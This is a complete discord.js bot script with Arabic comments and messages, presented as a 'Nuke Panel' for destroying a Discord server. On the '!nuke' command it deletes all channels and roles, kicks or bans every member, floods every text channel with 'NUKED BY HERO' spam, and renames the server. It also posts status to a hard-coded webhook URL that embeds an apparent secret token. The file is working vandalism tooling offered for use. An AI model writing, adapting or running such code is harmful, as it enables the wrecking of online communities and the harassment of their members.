const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');

// الإعدادات جاهزة
const TOKEN = process.env.TOKEN;
const GUILD_ID = '1561092473151819796';
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1566240069583634545/-hp7VNKkMIKSEYIs3_4vhHvjC4DTBdfLe_Jxk5dA8EyQCbP5yjCGg_zknhtnw1jvuUEc';

if (!TOKEN) {
    console.error("❌ تأكد من إضافة TOKEN في قسم Environment");
    process.exit(1);
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ],
});

async function sendWebhook(content) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content, username: 'Nuke Panel' }),
        });
    } catch (err) {}
}

client.once('ready', async () => {
    console.log(`Logged in as ${client.user.tag}`);

    await sendWebhook(
        `**✅ البوت جاهز ومضبوط**\n` +
        `**اختر العملية بكتابة الرقم في الشات:**\n` +
        `\`1\` — حذف كل الرومات\n` +
        `\`2\` — حذف كل الرولات\n` +
        `\`3\` — طرد كل الأعضاء\n` +
        `\`4\` — حظر كل الأعضاء\n` +
        `\`5\` — سبام رسائل\n` +
        `\`6\` — تسمية السيرفر\n` +
        `\`7\` — حذف رومات ورولات\n` +
        `\`8\` — جحفلة كاملة (حذف + رولات + سبام + تسمية)\n` +
        `\`0\` — إلغاء`
    );
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith('!nuke')) return;

    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply('❌ لازم تكون أدمن.');
    }

    const guild = client.guilds.cache.get(GUILD_ID);
    if (!guild) return message.reply('❌ ما لقيت السيرفر.');

    await message.reply('⚠️ اكتب رقم العملية (1-8) خلال 30 ثانية. اكتب `0` للإلغاء.');

    const filter = (m) => m.author.id === message.author.id && /^\d$/.test(m.content.trim());
    let collected;

    try {
        collected = await message.channel.awaitMessages({
            filter, max: 1, time: 30000, errors: ['time'],
        });
    } catch {
        return message.channel.send('❌ انتهى الوقت — ألغيت.');
    }

    const choice = parseInt(collected.first().content.trim());

    if (choice === 0) return message.channel.send('🛑 ألغيت العملية.');

    await message.channel.send(`🔥 جاري تنفيذ الخيار \`${choice}\`...`);

    try {
        switch (choice) {
            case 1: await deleteAllChannels(guild, message.channel.id); break;
            case 2: await deleteAllRoles(guild); break;
            case 3: await kickAllMembers(guild); break;
            case 4: await banAllMembers(guild); break;
            case 5: await spamAllChannels(guild); break;
            case 6: await guild.setName('NUKED-BY-HERO').catch(() => {}); break;
            case 7:
                await deleteAllChannels(guild, message.channel.id);
                await deleteAllRoles(guild);
                break;
            case 8:
                await deleteAllChannels(guild, message.channel.id);
                await deleteAllRoles(guild);
                await spamAllChannels(guild);
                await guild.setName('NUKED-BY-HERO').catch(() => {});
                break;
            default:
                return message.channel.send('❌ رقم غير معروف.');
        }

        await message.channel.send(`✅ انتهى تنفيذ الخيار \`${choice}\`.`).catch(() => {});
        
        // رسالة تذكير أمنية بالويب هوك
        await sendWebhook(`**⚠️ تذكير أمني:** الجحفلة خلصت. لا تنسى تدخل على Discord Developer Portal وتعمل **Reset Token** للبوت عشان تضمن أمانو!`);

    } catch (err) {
        await message.channel.send(`❌ خطأ: \`${err.message}\``).catch(() => {});
    }
});

async function deleteAllChannels(guild, keepChannelId) {
    for (const channel of guild.channels.cache.values()) {
        if (channel.id === keepChannelId) continue;
        try { await channel.delete(); await sleep(300); } catch {}
    }
}

async function deleteAllRoles(guild) {
    const me = guild.members.me;
    for (const role of guild.roles.cache.values()) {
        if (role.id === guild.id || role.managed || role.position >= me.roles.highest.position) continue;
        try { await role.delete(); await sleep(300); } catch {}
    }
}

async function kickAllMembers(guild) {
    for (const member of guild.members.cache.values()) {
        if (member.id === client.user.id || member.id === guild.ownerId) continue;
        try { await member.kick('nuke'); await sleep(500); } catch {}
    }
}

async function banAllMembers(guild) {
    for (const member of guild.members.cache.values()) {
        if (member.id === client.user.id || member.id === guild.ownerId) continue;
        try { await member.ban({ reason: 'nuke' }); await sleep(500); } catch {}
    }
}

async function spamAllChannels(guild) {
    const spam = '💀 **NUKED BY HERO** 💀 '.repeat(10);
    for (const channel of guild.channels.cache.values()) {
        if (!channel.isTextBased()) continue;
        try {
            for (let i = 0; i < 5; i++) { await channel.send(spam); await sleep(400); }
        } catch {}
    }
}

function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }

client.login(TOKEN);
